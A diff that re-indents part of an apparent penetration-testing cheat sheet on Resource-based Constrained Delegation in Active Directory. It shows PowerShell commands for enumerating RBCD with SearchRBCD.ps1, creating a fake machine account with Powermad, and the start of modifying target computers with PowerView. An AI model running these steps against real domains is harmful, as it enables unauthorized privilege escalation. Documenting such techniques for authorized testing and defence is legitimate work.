@@ -37,15 +37,15 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
       }
   }
   ```
-  2. RBCD Enumeration
-    ```powershell
-    .\SearchRBCD.ps1
-    ```
-  3. Use PowerMad to create a fake computer
-    ```powershell
-    Import-Module .\Powermad.ps1
-    New-MachineAccount -MachineAccount <FakeMachineName> -Password $(ConvertTo-SecureString "<password>" -AsPlainText -Force)
-    ```
+2. RBCD Enumeration
+  ```powershell
+  .\SearchRBCD.ps1
+  ```
+3. Use PowerMad to create a fake computer
+  ```powershell
+  Import-Module .\Powermad.ps1
+  New-MachineAccount -MachineAccount <FakeMachineName> -Password $(ConvertTo-SecureString "<password>" -AsPlainText -Force)
+  ```
   4. Modify the target computers
     ```powershell
     Import-Module .\Powerview.ps1
